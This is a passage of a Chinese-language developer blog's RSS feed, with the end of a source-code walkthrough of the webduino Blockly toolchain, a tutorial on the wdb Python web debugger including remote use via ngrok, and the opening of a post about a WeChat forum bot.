        &lt;span class="nx"&gt;boardReady&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;autoReconnect&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="mi"&gt;5000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;

    &lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;webduino&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;BoardEvent&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ERROR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;isConnected&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;webduino&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;BoardEvent&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;DISCONNECT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;terminate&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;disconnect&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;terminate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;});&lt;/span&gt;

    &lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;webduino&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;BoardEvent&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;READY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="nx"&gt;boards&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中board定义在&lt;a href="https://github.com/webduinoio/webduino-js/blob/master/src/core/Board.js#L63"&gt;Board&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过&lt;a href="https://github.com/webduinoio/webduino-js/blob/44023cf71ef3fcf3a618f7abab6d69ee17de9000/src/core/EventEmitter.js#L14"&gt;EventEmitter&lt;/a&gt;传递全局消息&lt;/p&gt;
&lt;h3&gt;休眠一秒&lt;/h3&gt;
&lt;p&gt;在js中休眠是个有趣的话题，我们知道js是非阻塞的,webduino使用await来实现(很新的特性，之后会通过babel来在浏览器里编译，后文再说)&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/webduinoee40c06e.png" /&gt;&lt;/p&gt;
&lt;p&gt;对应的代码是&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;rgbled&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;


&lt;span class="nx"&gt;boardReady&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Smart&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;192.168.0.119&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;systemReset&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;samplingInterval&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="nx"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;delay&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nx"&gt;rgbled&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;getRGBLedCathode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nx"&gt;rgbled&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setColor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#ff0000&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;

&lt;span class="p"&gt;}());&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这部分很有意思，我们仅仅添加一个等待一秒的模块，生成的代码结构整体变了，新添加的模块并不特殊，它生成的代码为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;JavaScript&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;delay&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;block&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;value_secs_&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;JavaScript&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;valueToCode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;block&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;secs_&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;JavaScript&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ORDER_NONE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;await delay(&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;value_secs_&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;);\n&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
          &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以推测，代码在generate之前有个预处理,大概是根据generate出来的代码里是够包含&lt;code&gt;await&lt;/code&gt;关键字来处理，我们可以搜索源码来验证我们的想法:&lt;a href="https://github.com/webduinoio/webduino-blockly/search?utf8=%E2%9C%93&amp;amp;q=await&amp;amp;type="&gt;search await&lt;/a&gt;,果不其然&lt;/p&gt;
&lt;h1&gt;代码执行&lt;/h1&gt;
&lt;h3&gt;早期&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/webduinoio/webduino-blockly/blob/0b52eb33696834137630aaf9bcbb2547982f7be9/components/blockly-src/demos/code/code.js#L503"&gt;blockly-src/demos/code/code.js Code.runJS&lt;/a&gt;这个好理解,早期的做法，目前被废弃&lt;/p&gt;
&lt;p&gt;早期的执行机制如注释中说的&lt;code&gt;Just a quick and dirty eval&lt;/code&gt;，简单粗暴&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;JavaScript&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;workspaceToCode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Code&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;workspace&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;Blockly&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;JavaScript&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;INFINITE_LOOP_TRAP&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;MSG&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;badCode&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;%1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;后来的机制颇为费解&lt;/p&gt;
&lt;h3&gt;后来的机制&lt;/h3&gt;
&lt;p&gt;我们可以从&lt;a href="https://github.com/webduinoio/webduino-blockly/blob/19e40f0108e72dbd08628705a1e4fad9c3ccab7e/code.js#L876"&gt;bindClick runButton&lt;/a&gt;追踪起、经过&lt;a href="https://github.com/webduinoio/webduino-blockly/blob/19e40f0108e72dbd08628705a1e4fad9c3ccab7e/code.js#L1019"&gt;Code.reloadSandbox()&lt;/a&gt;,在这个函数中将模块generate为代码:&lt;a href="https://github.com/webduinoio/webduino-blockly/blob/19e40f0108e72dbd08628705a1e4fad9c3ccab7e/code.js#L1165"&gt;Code.getContext&lt;/a&gt;,generate的过程会判断是否需要使用babel编译，如果需要会做好编辑，在之后的程序中用babel编译它:&lt;a href="https://github.com/webduinoio/webduino-blockly/blob/19e40f0108e72dbd08628705a1e4fad9c3ccab7e/code.js#L1183"&gt;Code.transform&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如此一来我们就得到了可在普通浏览器里运行的js代码,如果是早期的做法，至此丢到eval里就结束了，目前的做法要复杂些，把代码丢到一个iframe中跑,用到了&lt;a href="https://github.com/bahmutov/iframe-api"&gt;iframe-api&lt;/a&gt; (本质上是window.postMessage)&lt;/p&gt;
&lt;p&gt;一些核心步骤如下:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/webduinoio/webduino-blockly/blob/19e40f0108e72dbd08628705a1e4fad9c3ccab7e/code.js#L1102"&gt;launcher.sandbox(frame, data);&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/webduinoio/webduino-blockly/blob/19e40f0108e72dbd08628705a1e4fad9c3ccab7e/launcher.js#L132"&gt;sandbox: function (frame, data) &lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;通信过程&lt;/h1&gt;
&lt;h3&gt;websocket&lt;/h3&gt;
&lt;p&gt;我们先关注采用websocket的通信过程(本地运行)&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/webduinoio/webduino-js/blob/44023cf71ef3fcf3a618f7abab6d69ee17de9000/src/transport/WebSocketTransport.js#L43"&gt;onmessage handle&lt;/a&gt;定义了收到smart数据的回调&lt;/p&gt;
&lt;p&gt;值得注意的是，数据的传输使用了二进制数据&lt;/p&gt;
&lt;p&gt;之后通过事件系统发布消息,emit的定义之处在&lt;a href="https://github.com/webduinoio/webduino-js/blob/44023cf71ef3fcf3a618f7abab6d69ee17de9000/src/core/EventEmitter.js#L36"&gt;EventEmitter emit&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ps:使用mqtt与云端通信的部分在这 &lt;a href="https://github.com/webduinoio/webduino-js/blob/44023cf71ef3fcf3a618f7abab6d69ee17de9000/src/transport/MqttTransport.js"&gt;MqttTransport.js&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;控制流&lt;/h1&gt;
&lt;p&gt;有了上边这些探索，我们可以挑战最后一个问题了，控制指令是如何抵达smart的，拿最初的例子来说，把点亮红灯积木块跑起来的时候发生了什么？&lt;/p&gt;
&lt;p&gt;首先是积木生成对应的代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="nx"&gt;rgbled&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;getRGBLedCathode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;board&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nx"&gt;rgbled&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setColor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#ff0000&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;board我们在前头说过，检索源码发现&lt;a href="https://github.com/webduinoio/webduino-blockly/blob/19e40f0108e72dbd08628705a1e4fad9c3ccab7e/webduino-blockly.js#L207"&gt;getRGBLedCathode&lt;/a&gt;不过是对&lt;code&gt;webduino.module.RGBLed&lt;/code&gt;的包装&lt;/p&gt;
&lt;p&gt;于是我们到&lt;a href="https://github.com/webduinoio/webduino-js"&gt;webduino-js&lt;/a&gt;继续探索.我们沿着&lt;code&gt;rgbled.setColor('#ff0000');&lt;/code&gt;一路追踪下去，看到&lt;a href="https://github.com/webduinoio/webduino-js/blob/master/src/module/DataTransfer.js"&gt;DataTransfer.js&lt;/a&gt;  , webduino采用二进制来通信，发送数据的地方定义在&lt;a href="https://github.com/webduinoio/webduino-js/blob/master/src/core/Board.js#L819"&gt;send&lt;/a&gt; -&amp;gt; &lt;a href="https://github.com/webduinoio/webduino-js/blob/44023cf71ef3fcf3a618f7abab6d69ee17de9000/src/transport/WebSocketTransport.js#L56"&gt;sendOut&lt;/a&gt; 在此我们可以看到数据的发送也是用的二进制（收发都是)&lt;/p&gt;
&lt;h1&gt;其他感兴趣的地方&lt;/h1&gt;
&lt;h3&gt;与页面元素交互&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/webduinoio/webduino-blockly/blob/19e40f0108e72dbd08628705a1e4fad9c3ccab7e/generators/webduino.js#L54"&gt;demo_light_click generator&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://javascript.ruanyifeng.com/stdlib/arraybuffer.html"&gt;JavaScript 标准参考教程 二进制数组&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.villainhr.com/page/2017/04/16/Web%20%E7%9B%B4%E6%92%AD%E6%B5%81%E7%9A%84%E8%A7%A3%E6%9E%90"&gt;Web 直播流的解析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 21 May 2017 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2017-05-21:webduino-analysis.html</guid><category>rpi</category></item><item><title>使用wdb来调试python程序</title><link>/debug-with-wdb.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/wdb8b9dbcda.png" /&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a href="https://github.com/Kozea/wdb"&gt;wdb&lt;/a&gt;介绍&lt;/h1&gt;
&lt;p&gt;如果你用过pdb、ipdb或是pudb,那么你对调试python程序可能已经十分熟悉了&lt;/p&gt;
&lt;p&gt;下边推荐的wdb，和上述三个工具一样，都是为了帮助调试python程序而生。wdb的出众之处在于，它利用web技术，提供直观而友好的UI，让你不需要记住一堆的命令，就能在错误的上下文中轻松穿行，直至找出问题所在&lt;/p&gt;
&lt;p&gt;这种友好的体验和漂亮的UI，让人联想到jupyter--另一个借助web技术来帮助python开发的神器&lt;/p&gt;
&lt;p&gt;在技术层面，wdb采用client-server架构，使用websocekt来进行实时通信，这个思路和jupyter也相似(如果你对jupyter的架构有兴趣，可以参考我之前的文章)&lt;/p&gt;
&lt;p&gt;在使用体验式，wdb做的非常棒，我喜欢的一些点包括:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;左边栏的堆栈，可以随时点击进入。之后可自由探索其中的上下文(当然，web调试方面,Werkzeug在这块也做的很好)&lt;/li&gt;
&lt;li&gt;常用操作变为菜单按钮(免去记忆的负担)&lt;/li&gt;
&lt;li&gt;强大的tab补全&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;h3&gt;ubuntu&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pip install wdb 
pip install wdb.server 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;mac&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pip install wdb  --no-use-wheel
pip install wdb.server --no-use-wheel
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;使用&lt;/h1&gt;
&lt;p&gt;首先运行:&lt;code&gt;wdb.server.py&lt;/code&gt; (建议跑在一个tmux窗口中)，服务起来后，默认跑在端口:1984&lt;/p&gt;
&lt;p&gt;在需要调试的程序中加上 &lt;code&gt;import wdb;wdb.set_trace()&lt;/code&gt;，你一定似曾相识，没错，用法和pdb、ipdb完全相同 &lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="" /&gt;&lt;/p&gt;
&lt;h3&gt;一个案例&lt;/h3&gt;
&lt;p&gt;我们以调试一个flask app为例(当然你可能更偏好flask原生的调试工具)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flask&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Flask&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flask&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;
&lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Flask&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vm"&gt;__name__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nd"&gt;@app.route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;hello_world&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;wdb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;wdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_trace&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;!&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们来运行它:&lt;code&gt;python flask_app.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接着我们访问:&lt;code&gt;127.0.0.1:5000?name=斐德洛&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/wdb8b9dbcda.png" /&gt;&lt;/p&gt;
&lt;p&gt;tab补全功能非常强大,惬意如jupyter&lt;/p&gt;
&lt;h3&gt;远程调试&lt;/h3&gt;
&lt;p&gt;如果你想用wdb调试服务器上的程序，要麻烦一些，wdb的客户端基于web技术，所以你需要远程访问到客户端的端口&lt;/p&gt;
&lt;p&gt;因为是远程调试，所以弃用默认打开本地浏览器的选项,通过&lt;code&gt;WDB_NO_BROWSER_AUTO_OPEN=True&lt;/code&gt;变量来控制，具体而言就是在你运行带测试程序(网站)时，加上&lt;code&gt;WDB_NO_BROWSER_AUTO_OPEN=True&lt;/code&gt;，诸如&lt;code&gt;WDB_NO_BROWSER_AUTO_OPEN=True python flask_app.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;运行之后你在命令行将看到类似下边的输出:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;You can now launch your browser at http://[wdb.server]/debug/session/28dca05c-0eac-abcd-8fb0-5546a22e774f
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;接着新起一个tmux窗口，用ngrok把1984端口映射出来,类似这样:&lt;code&gt;./ngrok --config ngrok.cfg --subdomain test_wdb  1984&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;之后直接访问ngrok映射出来的网址加上&lt;code&gt;/debug/session/28dca05c-0eac-abcd-8fb0-5546a22e774f&lt;/code&gt;即可,形如:&lt;code&gt;test_wdb.ngrok.io/debug/session/28dca05c-0eac-abcd-8fb0-5546a22e774f&lt;/code&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 01 May 2017 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2017-05-01:debug-with-wdb.html</guid><category>dev-tools</category></item><item><title>论坛机器人的技术实现</title><link>/paperweekly-forum-bot.html</link><description>&lt;p&gt;&lt;img alt="" src="https://raw.githubusercontent.com/wwj718/gif_bed/master/paperweekly_all.jpg" /&gt;&lt;/p&gt;
&lt;h1&gt;前言&lt;/h1&gt;
&lt;p&gt;@张俊同学有天晚上邀我写一期文章，介绍论坛机器人的技术实现。登时诚惶诚恐，群里大神云集，我此前写的这个粗陋的机器人实在难登大雅之堂。考虑到机器人还在群里头用，就献丑来简单介绍下技术层面的实现，方便大家日后改进它 ：）&lt;/p&gt;
&lt;p&gt;本文侧重谈论整体的设计和实现，至于细节，大家可以看&lt;a href="https://github.com/wwj718/paperweekly_forum"&gt;源码&lt;/a&gt;和文档(文档在doc目录下)  ：）&lt;/p&gt;
&lt;h1&gt;功能&lt;/h1&gt;
&lt;p&gt;论坛机器人目前实现了三个功能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;微信群与&lt;a href="http://paperweekly.club"&gt;paperweekly论坛&lt;/a&gt;的双向通信(发帖/回复)&lt;/li&gt;
&lt;li&gt;paperweekly1群和2群的消息转发（当前只支持文本和表情）&lt;ul&gt;
&lt;li&gt;更多功能(图片/链接/跨群@)在todo list中&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;问题检索&lt;ul&gt;
&lt;li&gt;支持中文提问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
